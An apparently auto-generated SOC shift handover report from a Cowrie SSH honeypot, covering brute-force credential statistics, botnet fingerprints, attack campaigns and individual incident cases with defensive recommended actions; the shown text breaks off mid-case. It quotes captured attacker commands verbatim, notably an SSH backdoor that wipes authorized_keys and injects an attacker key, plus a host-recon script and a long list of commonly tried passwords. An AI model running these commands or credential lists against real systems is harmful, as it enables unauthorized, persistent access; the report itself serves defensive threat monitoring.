# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-04 |
| **Generated At** | 2026-08-04T06:32:34Z |
| **Shift Time** | 06:32 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **280** |
| Confirmed Threats | **229** |
| False Positives Filtered | **51** (18.2%) |
| Unique Attacker IPs | **158** |
| Countries of Origin | **41** |
| High Severity Cases | **117** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **163** |
| Malware Samples Analyzed | **4** HIGH · **26** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **150** |
| Unique Credential Pairs | **74** |
| Unique Usernames | **25** |
| Unique Passwords | **63** |
| Successful Auth Pairs | **129** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 52 |
| `admin` | 21 |
| `support` | 13 |
| `345gs5662d34` | 12 |
| `supervisor` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 12 |
| `3245gs5662d34` | 10 |
| `support` | 7 |
| `zyad1234` | 6 |
| `admin` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 12 |
| `support` | `support` | 7 |
| `supervisor` | `zyad1234` | 6 |
| `root` | `3245gs5662d34` | 6 |
| `admin` | `admin` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `support` | `support` | `10.0.0.73` | 2026-08-04T00:55:58 |
| `supervisor` | `zyad1234` | `10.0.0.73` | 2026-08-04T00:58:11 |
| `admin` | `admin99` | `63.135.169.175` | 2026-08-04T00:58:22 |
| `admin` | `admin99` | `103.174.145.35` | 2026-08-04T00:58:34 |
| `supervisor` | `zyad1234` | `200.232.114.71` | 2026-08-04T00:59:49 |
| `supervisor` | `zyad1234` | `172.90.128.97` | 2026-08-04T00:59:57 |
| `blank` | `blank00` | `10.0.0.73` | 2026-08-04T01:06:44 |
| `root` | `ABCdef123` | `177.53.215.134` | 2026-08-04T01:07:03 |
| `345gs5662d34` | `345gs5662d34` | `177.53.215.134` | 2026-08-04T01:07:05 |
| `root` | `3245gs5662d34` | `177.53.215.134` | 2026-08-04T01:07:06 |
| `king` | `123456` | `119.156.194.77` | 2026-08-04T01:08:14 |
| `345gs5662d34` | `345gs5662d34` | `119.156.194.77` | 2026-08-04T01:08:21 |
| `king` | `3245gs5662d34` | `119.156.194.77` | 2026-08-04T01:08:24 |
| `admin` | `admin99` | `10.0.0.73` | 2026-08-04T01:10:01 |
| `supervisor` | `zyad1234` | `196.190.180.18` | 2026-08-04T01:16:00 |
| `supervisor` | `zyad1234` | `36.78.151.13` | 2026-08-04T01:16:14 |
| `blank` | `blank00` | `201.218.0.25` | 2026-08-04T01:25:25 |
| `blank` | `blank00` | `200.105.141.172` | 2026-08-04T01:25:32 |
| `blank` | `blank00` | `179.185.227.77` | 2026-08-04T01:25:39 |
| `admin` | `1234` | `92.5.66.49` | 2026-08-04T01:31:50 |
| `admin` | `system` | `85.104.111.237` | 2026-08-04T01:33:57 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-08-04T01:34:03 |
| `admin` | `system` | `65.20.161.126` | 2026-08-04T01:34:04 |
| `root` | `123@@@` | `144.22.238.238` | 2026-08-04T01:34:06 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-08-04T01:34:13 |
| `support` | `support` | `176.53.159.196` | 2026-08-04T01:36:09 |
| `admin` | `!QAZ2wsx` | `10.0.0.73` | 2026-08-04T01:44:14 |
| `root` | `123456789123456789` | `81.192.46.29` | 2026-08-04T01:46:38 |
| `345gs5662d34` | `345gs5662d34` | `81.192.46.29` | 2026-08-04T01:46:41 |
| `root` | `3245gs5662d34` | `81.192.46.29` | 2026-08-04T01:46:41 |
| `root` | `2003` | `103.143.10.140` | 2026-08-04T01:47:32 |
| `345gs5662d34` | `345gs5662d34` | `103.143.10.140` | 2026-08-04T01:47:34 |
| `root` | `3245gs5662d34` | `103.143.10.140` | 2026-08-04T01:47:35 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `147.185.133.63` | 2026-08-04T01:48:01 |
| `root` | `` | `94.154.43.231` | 2026-08-04T01:50:38 |
| `visionupdater` | `visionupdater` | `185.148.144.114` | 2026-08-04T02:00:21 |
| `345gs5662d34` | `345gs5662d34` | `185.148.144.114` | 2026-08-04T02:00:23 |
| `visionupdater` | `3245gs5662d34` | `185.148.144.114` | 2026-08-04T02:00:24 |
| `sshd` | `password` | `196.188.93.169` | 2026-08-04T02:06:48 |
| `sshd` | `password` | `110.25.107.25` | 2026-08-04T02:06:56 |
| `root` | `admin@123` | `65.20.205.197` | 2026-08-04T02:08:18 |
| `root` | `admin@123` | `117.211.15.106` | 2026-08-04T02:08:31 |
| `ubnt` | `ubnt2` | `10.0.0.73` | 2026-08-04T02:15:20 |
| `pi` | `abcd1234` | `10.0.0.73` | 2026-08-04T02:16:03 |
| `sshd` | `password` | `10.0.0.73` | 2026-08-04T02:18:31 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-04T02:23:50 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-04T02:23:50 |
| `root` | `admin@123` | `104.152.58.233` | 2026-08-04T02:24:35 |
| `root` | `admin@123` | `182.73.164.228` | 2026-08-04T02:24:43 |
| `unknown` | `unknown00` | `10.0.0.73` | 2026-08-04T02:41:14 |
| `admin` | `admin` | `94.154.43.210` | 2026-08-04T02:47:02 |
| `operator` | `123654` | `10.0.0.73` | 2026-08-04T02:49:29 |
| `user1` | `12345` | `10.0.0.73` | 2026-08-04T02:52:56 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-04T02:57:12 |
| `operator` | `123654` | `107.135.117.245` | 2026-08-04T03:08:10 |
| `operator` | `123654` | `111.193.160.143` | 2026-08-04T03:08:24 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-08-04T03:12:51 |
| `support` | `a123456` | `10.0.0.73` | 2026-08-04T03:15:24 |
| `support` | `a123456` | `223.99.212.58` | 2026-08-04T03:17:12 |
| `support` | `a123456` | `196.189.124.229` | 2026-08-04T03:17:21 |
| `developer` | `developerpass` | `116.1.149.196` | 2026-08-04T03:20:35 |
| `root` | `Admin$2023` | `61.76.136.25` | 2026-08-04T03:26:42 |
| `345gs5662d34` | `345gs5662d34` | `61.76.136.25` | 2026-08-04T03:26:46 |
| `root` | `3245gs5662d34` | `61.76.136.25` | 2026-08-04T03:26:47 |
| `vmuser` | `vmuser` | `45.194.17.98` | 2026-08-04T03:26:54 |
| `345gs5662d34` | `345gs5662d34` | `45.194.17.98` | 2026-08-04T03:26:57 |
| `vmuser` | `3245gs5662d34` | `45.194.17.98` | 2026-08-04T03:27:01 |
| `support` | `a123456` | `24.97.253.246` | 2026-08-04T03:33:21 |
| `support` | `a123456` | `103.121.27.218` | 2026-08-04T03:33:33 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-04T03:39:21 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-04T03:39:21 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-04T03:39:26 |
| `User` | `1234` | `155.212.17.174` | 2026-08-04T03:42:37 |
| `root` | `zxcvbn` | `120.48.26.185` | 2026-08-04T03:42:40 |
| `345gs5662d34` | `345gs5662d34` | `120.48.26.185` | 2026-08-04T03:42:52 |
| `stuff` | `stuff` | `157.230.52.12` | 2026-08-04T03:44:35 |
| `345gs5662d34` | `345gs5662d34` | `157.230.52.12` | 2026-08-04T03:44:37 |
| `stuff` | `3245gs5662d34` | `157.230.52.12` | 2026-08-04T03:44:37 |
| `guest` | `qwerty` | `74.208.177.56` | 2026-08-04T03:44:39 |
| `guest` | `qwerty` | `213.33.204.130` | 2026-08-04T03:44:46 |
| `admin` | `admin` | `130.211.103.2` | 2026-08-04T03:47:02 |
| `admin` | `1qaz2wsx` | `10.0.0.73` | 2026-08-04T03:49:55 |
| `root` | `Fw123456@` | `182.253.64.224` | 2026-08-04T04:06:56 |
| `345gs5662d34` | `345gs5662d34` | `182.253.64.224` | 2026-08-04T04:07:00 |
| `root` | `3245gs5662d34` | `182.253.64.224` | 2026-08-04T04:07:02 |
| `admin` | `1qaz2wsx` | `182.60.128.241` | 2026-08-04T04:08:02 |
| `admin` | `1qaz2wsx` | `182.156.35.238` | 2026-08-04T04:08:11 |
| `root` | `@12345` | `103.97.101.25` | 2026-08-04T04:08:26 |
| `345gs5662d34` | `345gs5662d34` | `103.97.101.25` | 2026-08-04T04:08:30 |
| `root` | `3245gs5662d34` | `103.97.101.25` | 2026-08-04T04:08:32 |
| `root` | `123` | `92.118.39.71` | 2026-08-04T04:08:51 |
| `root` | `1234` | `92.118.39.71` | 2026-08-04T04:10:55 |
| `saeid` | `saeid123` | `113.240.142.218` | 2026-08-04T04:12:18 |
| `345gs5662d34` | `345gs5662d34` | `113.240.142.218` | 2026-08-04T04:12:48 |
| `root` | `12345` | `92.118.39.71` | 2026-08-04T04:12:57 |
| `root` | `1234567` | `92.118.39.71` | 2026-08-04T04:17:01 |
| `test` | `22222` | `220.178.246.43` | 2026-08-04T04:17:20 |
| `test` | `22222` | `50.223.176.171` | 2026-08-04T04:17:34 |
| `root` | `12345678` | `92.118.39.71` | 2026-08-04T04:18:59 |
| `root` | `root2001` | `218.58.73.238` | 2026-08-04T04:19:38 |
| `root` | `123456789` | `92.118.39.71` | 2026-08-04T04:20:59 |
| `root` | `1234567890` | `92.118.39.71` | 2026-08-04T04:23:00 |
| `admin` | `admin` | `220.197.14.60` | 2026-08-04T04:23:28 |
| `dev` | `dev` | `10.0.0.73` | 2026-08-04T04:24:27 |
| `sftp` | `sftp` | `171.217.70.151` | 2026-08-04T04:24:50 |
| `root` | `123abc` | `92.118.39.71` | 2026-08-04T04:25:01 |
| `root` | `1qaz@WSX3edc` | `141.253.107.23` | 2026-08-04T04:25:15 |
| `root` | `1q2w3e4r` | `92.118.39.71` | 2026-08-04T04:27:07 |
| `root` | `P@ssw0rd123` | `92.118.39.71` | 2026-08-04T04:29:08 |
| `root` | `abc123` | `92.118.39.71` | 2026-08-04T04:31:06 |
| `root` | `admin123` | `92.118.39.71` | 2026-08-04T04:33:07 |
| `root` | `letmein` | `92.118.39.71` | 2026-08-04T04:35:12 |
| `root` | `pass123` | `92.118.39.71` | 2026-08-04T04:37:17 |
| `root` | `password` | `92.118.39.71` | 2026-08-04T04:39:24 |
| `root` | `password1` | `92.118.39.71` | 2026-08-04T04:41:23 |
| `dev` | `dev` | `181.212.174.164` | 2026-08-04T04:42:33 |
| `root` | `qwerty123` | `92.118.39.71` | 2026-08-04T04:43:18 |
| `admin` | `admin` | `45.154.244.193` | 2026-08-04T04:43:49 |
| `root` | `root123` | `92.118.39.71` | 2026-08-04T04:45:17 |
| `v` | `v` | `193.24.211.204` | 2026-08-04T04:45:56 |
| `root` | `welcome` | `92.118.39.71` | 2026-08-04T04:47:19 |
| `admin` | `123` | `92.118.39.71` | 2026-08-04T04:49:24 |
| `admin` | `1234` | `92.118.39.71` | 2026-08-04T04:51:36 |
| `guest` | `888888` | `200.106.49.149` | 2026-08-04T04:51:42 |
| `guest` | `888888` | `41.178.230.115` | 2026-08-04T04:51:55 |
| `guest` | `888888` | `183.167.217.86` | 2026-08-04T04:51:59 |
| `guest` | `888888` | `65.20.179.251` | 2026-08-04T04:52:07 |
| `admin` | `12345` | `92.118.39.71` | 2026-08-04T04:53:52 |
| `sftp` | `sftp` | `60.166.8.174` | 2026-08-04T04:54:09 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **280** |
| Sessions with Fingerprint | **22** |
| Unique HASSH Fingerprints | **22** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 66 |
| OpenSSH | 42 |
| Go SSH scanner | 34 |
| Paramiko (Python) | 10 |
| PuTTY | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 40 | 40 |
| `f555226df196...` | Mirai/variant | 39 | 12 |
| `2ec37a7cc8da...` | Mirai/variant | 23 | 1 |
| `a2de0f306611...` | Mirai/variant | 10 | 3 |
| `eff4c24daffc...` | Modern SSH client | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 40 | 40 | Mirai/variant |
| `f555226df196...` | libssh | 39 | 12 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 23 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 19 | 6 | — |
| `a2de0f306611...` | Paramiko (Python) | 10 | 3 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |
| `5bd26477da54...` | PuTTY | 2 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **9** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 22 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1592, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 10 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.71`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
uname -m
```
```
cat /proc/cpuinfo
```
```
/bin/busybox TEST
```
```
cat /proc
```
Source IPs: `94.154.43.210`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.97.101.25`, `182.253.64.224`, `61.76.136.25`, `185.148.144.114`, `119.156.194.77`, `177.53.215.134`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **158** |
| Unique ASNs | **107** |
| High-Risk ASNs | **73** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 8 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 7 | HIGH |
| `AS25369` | Hydra Communications Ltd | 6 | HIGH |
| `AS213412` | ONYPHE SAS | 6 | LOW |
| `AS31898` | Oracle Corporation | 5 | HIGH |
| `AS396982` | Google LLC | 5 | HIGH |
| `AS398324` | Censys, Inc. | 4 | HIGH |
| `AS46562` | Performive LLC | 3 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (116)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-923e4372e8f8

| Field | Detail |
|---|---|
| **Source IP** | `63.135.169[.]175` |
| **First Seen** | 2026-08-04 00:58 |
| **Last Seen** | 2026-08-04 00:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 00:58:21` | `cowrie.session.connect` |
| `2026-08-04 00:58:21` | `cowrie.client.version` |
| `2026-08-04 00:58:21` | `cowrie.client.kex` |
| `2026-08-04 00:58:22` | `cowrie.login.success` |
| `2026-08-04 00:58:23` | `cowrie.direct-tcpip.request` |
| `2026-08-04 00:58:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `63.135.169[.]175` to AbuseIPDB if not already reported
- [ ] Block `63.135.169[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83b3b1018231

| Field | Detail |
|---|---|
| **Source IP** | `103.174.145[.]35` |
| **First Seen** | 2026-08-04 00:58 |
| **Last Seen** | 2026-08-04 00:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 00:58:32` | `cowrie.session.connect` |
| `2026-08-04 00:58:33` | `cowrie.client.version` |
| `2026-08-04 00:58:33` | `cowrie.client.kex` |
| `2026-08-04 00:58:34` | `cowrie.login.success` |
| `2026-08-04 00:58:35` | `cowrie.direct-tcpip.request` |
| `2026-08-04 00:58:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.145[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.174.145[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60cc5f2666e2

| Field | Detail |
|---|---|
| **Source IP** | `200.232.114[.]71` |
| **First Seen** | 2026-08-04 00:59 |
| **Last Seen** | 2026-08-04 00:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 00:59:47` | `cowrie.session.connect` |
| `2026-08-04 00:59:47` | `cowrie.client.version` |
| `2026-08-04 00:59:47` | `cowrie.client.kex` |
| `2026-08-04 00:59:49` | `cowrie.login.success` |
| `2026-08-04 00:59:50` | `cowrie.direct-tcpip.request` |
| `2026-08-04 00:59:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.232.114[.]71` to AbuseIPDB if not already reported
- [ ] Block `200.232.114[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b9d7761c917

| Field | Detail |
|---|---|
| **Source IP** | `172.90.128[.]97` |
| **First Seen** | 2026-08-04 00:59 |
| **Last Seen** | 2026-08-04 01:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 00:59:55` | `cowrie.session.connect` |
| `2026-08-04 00:59:55` | `cowrie.client.version` |
| `2026-08-04 00:59:55` | `cowrie.client.kex` |
| `2026-08-04 00:59:57` | `cowrie.login.success` |
| `2026-08-04 00:59:57` | `cowrie.direct-tcpip.request` |
| `2026-08-04 01:00:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.90.128[.]97` to AbuseIPDB if not already reported
- [ ] Block `172.90.128[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7988a8287b44

| Field | Detail |
|---|---|
| **Source IP** | `177.53.215[.]134` |
| **First Seen** | 2026-08-04 01:07 |
| **Last Seen** | 2026-08-04 01:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:07:03` | `cowrie.session.connect` |
| `2026-08-04 01:07:03` | `cowrie.client.version` |
| `2026-08-04 01:07:03` | `cowrie.client.kex` |
| `2026-08-04 01:07:03` | `cowrie.login.success` |
| `2026-08-04 01:07:04` | `cowrie.session.params` |
| `2026-08-04 01:07:04` | `cowrie.command.input` |
| `2026-08-04 01:07:04` | `cowrie.command.failed` |
| `2026-08-04 01:07:04` | `cowrie.log.closed` |
| `2026-08-04 01:07:05` | `cowrie.session.params` |
| `2026-08-04 01:07:05` | `cowrie.command.input` |
| `2026-08-04 01:07:05` | `cowrie.session.file_download` |
| `2026-08-04 01:07:05` | `cowrie.log.closed` |
| `2026-08-04 01:07:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.53.215[.]134` to AbuseIPDB if not already reported
- [ ] Block `177.53.215[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86274dbb81b4

| Field | Detail |
|---|---|
| **Source IP** | `177.53.215[.]134` |
| **First Seen** | 2026-08-04 01:07 |
| **Last Seen** | 2026-08-04 01:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:07:05` | `cowrie.session.connect` |
| `2026-08-04 01:07:05` | `cowrie.client.version` |
| `2026-08-04 01:07:05` | `cowrie.client.kex` |
| `2026-08-04 01:07:05` | `cowrie.login.success` |
| `2026-08-04 01:07:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.53.215[.]134` to AbuseIPDB if not already reported
- [ ] Block `177.53.215[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-555a8b331955

| Field | Detail |
|---|---|
| **Source IP** | `177.53.215[.]134` |
| **First Seen** | 2026-08-04 01:07 |
| **Last Seen** | 2026-08-04 01:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:07:05` | `cowrie.session.connect` |
| `2026-08-04 01:07:05` | `cowrie.client.version` |
| `2026-08-04 01:07:06` | `cowrie.client.kex` |
| `2026-08-04 01:07:06` | `cowrie.login.success` |
| `2026-08-04 01:07:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.53.215[.]134` to AbuseIPDB if not already reported
- [ ] Block `177.53.215[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9834153c36de

| Field | Detail |
|---|---|
| **Source IP** | `119.156.194[.]77` |
| **First Seen** | 2026-08-04 01:08 |
| **Last Seen** | 2026-08-04 01:08 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:08:12` | `cowrie.session.connect` |
| `2026-08-04 01:08:12` | `cowrie.client.version` |
| `2026-08-04 01:08:12` | `cowrie.client.kex` |
| `2026-08-04 01:08:14` | `cowrie.login.success` |
| `2026-08-04 01:08:16` | `cowrie.session.params` |
| `2026-08-04 01:08:16` | `cowrie.command.input` |
| `2026-08-04 01:08:16` | `cowrie.command.failed` |
| `2026-08-04 01:08:17` | `cowrie.log.closed` |
| `2026-08-04 01:08:18` | `cowrie.session.params` |
| `2026-08-04 01:08:18` | `cowrie.command.input` |
| `2026-08-04 01:08:18` | `cowrie.session.file_download` |
| `2026-08-04 01:08:18` | `cowrie.log.closed` |
| `2026-08-04 01:08:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.156.194[.]77` to AbuseIPDB if not already reported
- [ ] Block `119.156.194[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-decc63d81e9a

| Field | Detail |
|---|---|
| **Source IP** | `119.156.194[.]77` |
| **First Seen** | 2026-08-04 01:08 |
| **Last Seen** | 2026-08-04 01:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:08:19` | `cowrie.session.connect` |
| `2026-08-04 01:08:19` | `cowrie.client.version` |
| `2026-08-04 01:08:19` | `cowrie.client.kex` |
| `2026-08-04 01:08:21` | `cowrie.login.success` |
| `2026-08-04 01:08:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.156.194[.]77` to AbuseIPDB if not already reported
- [ ] Block `119.156.194[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f4fd10561ba

| Field | Detail |
|---|---|
